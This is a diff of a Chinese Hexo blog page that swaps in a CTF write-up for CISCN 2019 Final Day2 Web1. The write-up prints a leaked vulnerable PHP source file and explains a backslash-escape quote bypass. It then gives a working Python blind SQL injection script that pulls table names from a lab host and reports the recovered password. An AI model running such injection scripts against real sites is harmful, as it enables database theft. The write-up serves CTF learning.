@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="绕过open-basedir, Hexo">
+    <meta name="keywords" content="CISCN_2019_Final_12_Day2_Web1, Hexo">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>绕过open-basedir | Hexo</title>
+    <title>CISCN_2019_Final_12_Day2_Web1 | Hexo</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">绕过open-basedir</h1>
+                    <h1 class="description center-align post-title">CISCN_2019_Final_12_Day2_Web1</h1>
                 </div>
             </div>
         </div>
@@ -443,7 +443,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-06-05
+                    2021-06-15
                 </div>
                 
 
@@ -464,10 +464,68 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>#前言</p>
-<p>emmmm，只是学习时候的随笔记录一下。。。</p>
+                <p>#前言<br>最近要期末复习，就没有什么时间学习CTF，想着就跟着大佬的思路走一遍慢慢学</p>
 <a id="more"></a>
 
+<p>打开题目是一个登录框，然后尝试了，报错注入以及rollup发现我无列名注入竟然又不会了</p>
+<p>害…明天下午要把sql注入好好在看一看</p>
+<p>然后扫描，发现有robots.txt，我第一眼认为这没有啥东西</p>
+<p><img src="1.png"></p>
+<p>但是，我们看到这里就必需有警惕心，想一下为什么会提示到php.bak,那么就猜测课能存在一个备份泄露的问题</p>
+<p>然后尝试index.php.bak,image.php.bak,user.php.bak,反正在ctrl u里面存在的东西都不能放过，然后造image.php.bak里面中找到了源码</p>
+<p>代码审计</p>
+<pre><code>&lt;?php
+include &#39;config.php&#39;;//提示了存在config.php
+
+$id=isset($_GET[&#39;id&#39;])?$_GET[&#39;id&#39;]:&#39;1&#39;;
+$path=isset($_GET[&#39;path&#39;])?$_GET[&#39;path&#39;]:&#39;&#39;;
+
+$id=addslashes($id);
+$path=addslashes($path);
+
+$id=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id);
+$path=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$path);
+
+$result=mysqli_query($con,&quot;select * from images where id=&#39;&#123;$id&#125;&#39; or path=&#39;&#123;$path&#125;&#39;&quot;);
+
+$row=mysqli_fetch_array($result,MYSQLI_ASSOC);
+
+$path=&quot;./&quot;.$row[&quot;path&quot;];
+
+header(&quot;Content-Type: image/jpeg&quot;);
+readfile($path);</code></pre>
+<p><img src="2.PNG"></p>
+<p>然后从这里可以看来，这道题目是典型的布尔盲注，id=0正好报错，id为1显示正确</p>
+<p>主要考虑：</p>
+<p>怎么绕过单引号过滤，闭合id的单一号，把危险代码放在path变量里</p>
+<p>不能用单引号闭合单引号，但是我们可以用\转义单引号</p>
+<p>所以构造我们传入\0，就会被加上\0，然后在str_replace那里变成了\，完成了转义</p>
+<p>然后构造exp</p>
+<pre><code>import requests
+
+url = &quot;http://f687a40e-08b5-4265-aa8c-140752053bfe.node3.buuoj.cn/image.php?id=\\0&amp;path=&quot;
+result = &quot;&quot;
+for i in range(1,30):
+low = 32
+high =128
+mid = (high+low)//2
+while(low&lt;high):
+    payload = &quot;or id=if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=0x636973636e66696e616c),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;.format(i,mid)
+    html = requests.get(url+payload)
+    print(low,high,mid,&quot;:&quot;)
+    print(url+payload)
+    if &quot;JFIF&quot; in html.text:
+        low = mid+1
+    else:
+        high = mid
+    mid = (high+low)//2
+if(low ==32 or high==128):
+    break
+result = result + chr(mid)
+print(result)
+print(&quot;flag: &quot; ,result)</code></pre>
+<p>得到密码：<br>e18be75a8a54cf38a377</p>
+<p>然后登录</p>
 
                 
             </div>
@@ -494,7 +552,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://ckylsy.github.io/2021/06/05/%E7%BB%95%E8%BF%87open-basedir/">http://ckylsy.github.io/2021/06/05/%E7%BB%95%E8%BF%87open-basedir/</a>
+                    <a href="http://ckylsy.github.io/2021/06/15/CISCN-2019-Final-12-Day2-Web1/">http://ckylsy.github.io/2021/06/15/CISCN-2019-Final-12-Day2-Web1/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -701,31 +759,29 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2021/06/05/%E7%BB%95%E8%BF%87open-basedir/">
+                <a href="/2021/06/16/ctfshow-sql/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="绕过open-basedir">
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="ctfshow-sql">
                         
-                        <span class="card-title">绕过open-basedir</span>
+                        <span class="card-title">ctfshow-sql</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
                             #前言
-emmmm，只是学习时候的随笔记录一下。。。
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-05
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-06-16
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -734,7 +790,6 @@ emmmm，只是学习时候的随笔记录一下。。。
                         </span>
                     </div>
                 </div>
-
                 
             </div>
         </div>
@@ -745,13 +800,13 @@ emmmm，只是学习时候的随笔记录一下。。。
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/06/04/%E5%AE%8C%E7%BE%8E%E7%9A%84%E7%BC%BA%E7%82%B9/">
+                <a href="/2021/06/07/ctfshowcms/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="完美的缺点">
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="ctfshowcms">
                         
-                        <span class="card-title">完美的缺点</span>
+                        <span class="card-title">ctfshowcms</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -762,7 +817,7 @@ emmmm，只是学习时候的随笔记录一下。。。
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-04
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-07
                             </span>
                         <span class="publish-author">
                             
